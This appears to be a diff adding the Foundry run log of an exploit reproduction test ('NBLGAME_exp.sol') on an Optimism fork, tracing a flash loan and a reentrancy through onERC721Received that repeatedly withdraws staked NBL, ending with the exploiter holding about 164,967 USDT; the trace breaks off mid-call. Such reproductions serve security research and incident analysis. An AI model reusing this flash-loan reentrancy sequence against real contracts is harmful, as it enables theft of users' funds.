@@ -1,0 +1,401 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/NBLGAME_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1039492)
+Logs:
+  Exploiter USDT balance before attack: 0.000000
+  Exploiter WETH balance before attack: 0.000000000000000000
+  Exploiter USDT balance after attack: 164967.658585
+  Exploiter WETH balance after attack: 6.900257340231423430
+
+Traces:
+  [10109] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("optimism", 115293068 [1.152e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(NBF: [0x534e1a8a89548C44BE7abA1c3c27951801940C10], "NBF")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(NBL: [0x4B03afC91295ed778320c2824bAd5eb5A1d852DD], "NBL")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0x94b008aA00579c1307B0EF2c499aD98a8ce58e58], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0x4200000000000000000000000000000000000006], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], "NBL_USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], "NblNftStake")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(exploiterEOA: [0x1FD0a6A5e232EebA8020A40535AD07013Ec4ef12], "exploiterEOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(mainAttackContract: [0xE4D41BDD6459198B33Cc795ff280cEE02d91087b], "mainAttackContract")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1304631] ContractTest::testExploit()
+    ├─ [2519] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2400] USDT::decimals() [staticcall]
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Exploiter USDT balance before attack", val: 0, decimals: 6)
+    ├─ [2457] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2336] WETH::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance before attack", val: 0, decimals: 18)
+    ├─ [0] VM::prank(mainAttackContract: [0xE4D41BDD6459198B33Cc795ff280cEE02d91087b], exploiterEOA: [0x1FD0a6A5e232EebA8020A40535AD07013Ec4ef12])
+    │   └─ ← [Return]
+    ├─ [69119] NBF::transferFrom(mainAttackContract: [0xE4D41BDD6459198B33Cc795ff280cEE02d91087b], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 737)
+    │   ├─ emit Transfer(from: mainAttackContract: [0xE4D41BDD6459198B33Cc795ff280cEE02d91087b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 737)
+    │   ├─  storage changes:
+    │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 0 → 737
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 1
+    │   │   @ 0x8abde155dc0848cb968f27763eb4d4b264fe9f0accc08da32c97fe2fa49e8e64: 1 → 0
+    │   │   @ 0x428a1ba67c59ac9a5d011a21e0c88b5fa6f3022cfd8d6ebd6914838c701fb4ed: 737 → 0
+    │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x000000000000000000000000e4d41bdd6459198b33cc795ff280cee02d91087b → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [536] NBF::ownerOf(737) [staticcall]
+    │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    ├─ [0] VM::assertEq(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [2563] NBL::balanceOf(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91]) [staticcall]
+    │   └─ ← [Return] 1773100000000000000000000000 [1.773e27]
+    ├─ [974913] NBL_USDT::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1773100000000000000000000000 [1.773e27], 0, 0x)
+    │   ├─ [2563] NBL::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   └─ ← [Return] 1996585717636981305249724416 [1.996e27]
+    │   ├─ [2519] USDT::balanceOf(NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613]) [staticcall]
+    │   │   └─ ← [Return] 373170747826 [3.731e11]
+    │   ├─ [27794] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1773100000000000000000000000 [1.773e27])
+    │   │   ├─ emit Transfer(from: NBL_USDT: [0xfAF037caAfA9620bFAebc04C298Bf4A104963613], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1773100000000000000000000000 [1.773e27])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x49054eea6cae32f0b767113455ad5bda61e7a2c22212bf1a957858edb1643f49: 0x000000000000000000000000000000000000000006738978a17a9e3826ad7800 → 0x000000000000000000000000000000000000000000b8dcf107717329232d7800
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000005baac879a092b0f03800000
+    │   │   └─ ← [Return] true
+    │   ├─ [918766] ContractTest::uniswapV3FlashCallback(5319300000000000000000000 [5.319e24], 0, 0x)
+    │   │   ├─ [24773] USDT::approve(Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfe020fdd1aaac27b9cec9857aaf1eba42b9350434d42f805fce6d6f2ad4e1c5c: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24773] USDT::approve(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xbb7483c6d3206f5b8848b88a8ec543cf73a0fee30afab8ba4a4b874ff575ba0d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24651] NBL::approve(Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xfe020fdd1aaac27b9cec9857aaf1eba42b9350434d42f805fce6d6f2ad4e1c5c: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24651] NBL::approve(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xbb7483c6d3206f5b8848b88a8ec543cf73a0fee30afab8ba4a4b874ff575ba0d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [563] NBL::balanceOf(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91]) [staticcall]
+    │   │   │   └─ ← [Return] 1773100000000000000000000000 [1.773e27]
+    │   │   ├─ [24680] NBF::setApprovalForAll(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], true)
+    │   │   │   ├─ emit ApprovalForAll(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], operator: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], approved: true)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xc0edfeb05ef61cd91545bbcd6ed5a32dcf64dec523fdec82e35da8d26f6bc4df: 0 → 1
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [56038] NblNftStake::unlockSlot()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b4: 0 → 0x0000000000000000000000000000000000000000000000000000000065b250d1
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 1
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [196629] NblNftStake::depositNft(737, 0)
+    │   │   │   ├─ [57993] NBF::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 737)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], tokenId: 737)
+    │   │   │   │   ├─ [927] NblNftStake::onERC721Received(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 737, 0x)
+    │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 737 → 0
+    │   │   │   │   │   @ 0x85d59c2be79578191f7f884f3512d37ea04978a46bea8a84f968d925ac8021c9: 0 → 2055
+    │   │   │   │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x0000000000000000000000005499178919c79086fd580d6c5f332a4253244d91
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 1 → 0
+    │   │   │   │   │   @ 0xe1eb72f1e4b69e1d3041a9adfb9baa0e2fc4087cddeabf988f56a68e6dc2876e: 2055 → 2056
+    │   │   │   │   │   @ 0x36bbcd5dd4b4a3eb3d83c7edb559153922f1b132b70b36e31104f5a6ee4cdced: 0 → 737
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [36963] 0x770b279678105B378f90055aAd1B22D2a0306baF::withdrawAll(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [2563] NBL::balanceOf(0x770b279678105B378f90055aAd1B22D2a0306baF) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4225669381403254864930361008 [4.225e27]
+    │   │   │   │   ├─ [3094] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x770b279678105B378f90055aAd1B22D2a0306baF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdraw(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 3: 0x0000000000000000000000000000000000000000000000000000000006df3b71 → 0x0000000000000000000000000000000000000000000000000000000006df3b8c
+    │   │   │   │   │   @ 5: 0x0000000000000000000000000000000000009b91e3f72a9a0eb76cf4d3d3163c → 0x0000000000000000000000000000000000009b9344214597b7ec76181a624b07
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [46263] 0x770b279678105B378f90055aAd1B22D2a0306baF::deposit(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
+    │   │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 100)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 100
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0 → 0x0000000000000000000000000000000000000000000042d1ae38b6f9b480903d
+    │   │   │   │   │   @ 6: 668871 → 668971
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit DepositNft(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 737)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b1: 0 → 737
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [563] NBL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1773100000000000000000000000 [1.773e27]
+    │   │   ├─ [111464] NblNftStake::depositNbl(0, 1773100000000000000000000000 [1.773e27])
+    │   │   │   ├─ [6354] NBL::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], value: 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000005baac879a092b0f03800000 → 0
+    │   │   │   │   │   @ 0x317d9a402d9335aaaab6b002e0b055f585d6b9972424e7617a06678512c4a200: 0x000000000000000000000000000000000000000005baac879a092b0f03800000 → 0x00000000000000000000000000000000000000000b75590f3412561e07000000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [9314] 0x770b279678105B378f90055aAd1B22D2a0306baF::withdraw(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100)
+    │   │   │   │   ├─ [563] NBL::balanceOf(0x770b279678105B378f90055aAd1B22D2a0306baF) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4225669381403254864930361008 [4.225e27]
+    │   │   │   │   ├─ [3094] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   │   ├─ emit Transfer(from: 0x770b279678105B378f90055aAd1B22D2a0306baF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdraw(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0x0000000000000000000000000000000000000000000042d1ae38b6f9b480903d → 0
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 100 → 0
+    │   │   │   │   │   @ 6: 668971 → 668871
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [46263] 0x770b279678105B378f90055aAd1B22D2a0306baF::deposit(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 800)
+    │   │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 800)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 6: 668871 → 669671
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 800
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0 → 0x00000000000000000000000000000000000000000002168d71c5b7cda40481ec
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit DepositNbl(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0, param2: 1773100000000000000000000000 [1.773e27], param3: 800)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b3: 0 → 0x000000000000000000000000000000000000000005baac879a092b0f03800000
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [414836] NblNftStake::withdrawNft(0)
+    │   │   │   ├─ [527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ [377949] NBF::safeTransferFrom(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 737)
+    │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 737)
+    │   │   │   │   ├─ [330238] ContractTest::onERC721Received(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 737, 0x)
+    │   │   │   │   │   ├─ [49319] NBF::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 737)
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], tokenId: 737)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x85d59c2be79578191f7f884f3512d37ea04978a46bea8a84f968d925ac8021c9: 0 → 2055
+    │   │   │   │   │   │   │   @ 0x36bbcd5dd4b4a3eb3d83c7edb559153922f1b132b70b36e31104f5a6ee4cdced: 0 → 737
+    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 1 → 0
+    │   │   │   │   │   │   │   @ 0xe1eb72f1e4b69e1d3041a9adfb9baa0e2fc4087cddeabf988f56a68e6dc2876e: 2055 → 2056
+    │   │   │   │   │   │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x0000000000000000000000005499178919c79086fd580d6c5f332a4253244d91
+    │   │   │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 737 → 0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [113228] NblNftStake::withdrawNft(0)
+    │   │   │   │   │   │   ├─ [527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   ├─ [49241] NBF::safeTransferFrom(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 737)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 737)
+    │   │   │   │   │   │   │   ├─ [1530] ContractTest::onERC721Received(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 737, 0x)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 1
+    │   │   │   │   │   │   │   │   @ 0x36bbcd5dd4b4a3eb3d83c7edb559153922f1b132b70b36e31104f5a6ee4cdced: 737 → 0
+    │   │   │   │   │   │   │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x0000000000000000000000005499178919c79086fd580d6c5f332a4253244d91 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   @ 0x85d59c2be79578191f7f884f3512d37ea04978a46bea8a84f968d925ac8021c9: 2055 → 0
+    │   │   │   │   │   │   │   │   @ 0xe1eb72f1e4b69e1d3041a9adfb9baa0e2fc4087cddeabf988f56a68e6dc2876e: 2056 → 2055
+    │   │   │   │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 0 → 737
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [5094] NBL::transfer(0x3993e4d57fF30984912b09B330BC66656fb99E08, 0)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: 0x3993e4d57fF30984912b09B330BC66656fb99E08, value: 0)
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [22994] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1773100000000000000000000000 [1.773e27])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000005baac879a092b0f03800000
+    │   │   │   │   │   │   │   │   @ 0x317d9a402d9335aaaab6b002e0b055f585d6b9972424e7617a06678512c4a200: 0x00000000000000000000000000000000000000000b75590f3412561e07000000 → 0x000000000000000000000000000000000000000005baac879a092b0f03800000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [9314] 0x770b279678105B378f90055aAd1B22D2a0306baF::withdraw(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 800)
+    │   │   │   │   │   │   │   ├─ [563] NBL::balanceOf(0x770b279678105B378f90055aAd1B22D2a0306baF) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4225669381403254864930361008 [4.225e27]
+    │   │   │   │   │   │   │   ├─ [3094] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x770b279678105B378f90055aAd1B22D2a0306baF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Withdraw(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 800)
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3f: 0x00000000000000000000000000000000000000000002168d71c5b7cda40481ec → 0
+    │   │   │   │   │   │   │   │   @ 6: 669671 → 668871
+    │   │   │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 800 → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ emit WithdrawNft(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 737)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b3: 0x000000000000000000000000000000000000000005baac879a092b0f03800000 → 0
+    │   │   │   │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b4: 0x0000000000000000000000000000000000000000000000000000000065b250d1 → 0
+    │   │   │   │   │   │   │   @ 0x0791c81fb879502e1e48021716fb96b3dc8fd8ca8d5f934a08f798c6669df5b1: 737 → 0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [158702] NblNftStake::depositNft(737, 0)
+    │   │   │   │   │   │   ├─ [51893] NBF::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], 737)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], tokenId: 737)
+    │   │   │   │   │   │   │   ├─ [927] NblNftStake::onERC721Received(NblNftStake: [0x5499178919C79086fd580d6c5f332a4253244D91], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 737, 0x)
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x36bbcd5dd4b4a3eb3d83c7edb559153922f1b132b70b36e31104f5a6ee4cdced: 0 → 737
+    │   │   │   │   │   │   │   │   @ 0xe1eb72f1e4b69e1d3041a9adfb9baa0e2fc4087cddeabf988f56a68e6dc2876e: 2055 → 2056
+    │   │   │   │   │   │   │   │   @ 0x9540bc03f63498a915b063cbaa271baef924ec8e87fc6ce6ca776d36a9703a37: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x0000000000000000000000005499178919c79086fd580d6c5f332a4253244d91
+    │   │   │   │   │   │   │   │   @ 0x85d59c2be79578191f7f884f3512d37ea04978a46bea8a84f968d925ac8021c9: 0 → 2055
+    │   │   │   │   │   │   │   │   @ 0x10674a0210f598c46ff7830a776a79618daec931e980c3cb40139c1bb040ed37: 737 → 0
+    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 1 → 0
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [9736] 0x770b279678105B378f90055aAd1B22D2a0306baF::withdrawAll(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   ├─ [563] NBL::balanceOf(0x770b279678105B378f90055aAd1B22D2a0306baF) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4225669381403254864930361008 [4.225e27]
+    │   │   │   │   │   │   │   ├─ [3094] NBL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x770b279678105B378f90055aAd1B22D2a0306baF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Withdraw(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [527] NBF::nftGrades(737) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
